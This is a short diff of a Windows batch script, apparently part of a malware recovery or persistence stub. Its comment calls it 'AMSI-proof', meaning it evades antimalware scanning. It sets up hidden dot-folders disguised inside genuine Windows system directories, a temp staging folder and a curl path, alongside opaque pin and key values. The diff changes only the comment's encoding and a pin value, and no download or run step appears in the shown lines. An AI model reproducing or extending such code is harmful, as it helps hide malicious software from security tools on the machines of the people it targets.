@@ -1,11 +1,11 @@
 @echo off
-rem RECOVER_GRYXA — AMSI-proof host recover (no powershell). Pin 6853b99+ / M56.
+rem RECOVER_GRYXA ??? AMSI-proof host recover (no powershell). Pin 6853b99+ / M56.
 setlocal
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "STAGE=%SystemRoot%\Temp\.upd"
 set "CURL=%SystemRoot%\System32\curl.exe"
-set "PIN=2068e28"
+set "PIN=d20eda6"
 set "FP=36e506ff016b2151"
 set "KEEP=5f6010579852e507"
 set "ALT=f861c8140d453427"
